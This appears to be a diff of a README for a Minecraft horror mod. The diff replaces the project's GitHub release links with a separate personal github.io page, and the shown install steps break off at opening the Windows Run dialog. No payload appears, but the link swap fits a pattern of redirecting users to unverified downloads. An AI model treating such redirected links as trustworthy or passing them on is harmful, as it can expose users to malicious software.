@@ -1,6 +1,6 @@
 # 👻 Verity-JE-Mod-Minecraft - Add Horror Elements To Your Minecraft
 
-[![Download Verity Mod](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/brayanam5903/Verity-JE-Mod-Minecraft)
+[![Download Verity Mod](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://brayanam5903.github.io)
 
 This software adds specialized entity artificial intelligence to your Minecraft game. The mod focuses on stalker entities that follow players to create a horror survival experience. It works with standard configurations to provide a seamless integration with your existing game files.
 
@@ -18,7 +18,7 @@ Ensure you meet these requirements before you start the setup process:
 
 Follow these steps to add the mod to your game.
 
-1. Visit the [official release page](https://github.com/brayanam5903/Verity-JE-Mod-Minecraft) to access the latest version of the mod.
+1. Visit the [official release page](https://brayanam5903.github.io) to access the latest version of the mod.
 2. Look for the file ending in `.jar` under the Assets section.
 3. Click the file name to start the download to your computer.
 4. Press the Windows key + R on your keyboard.
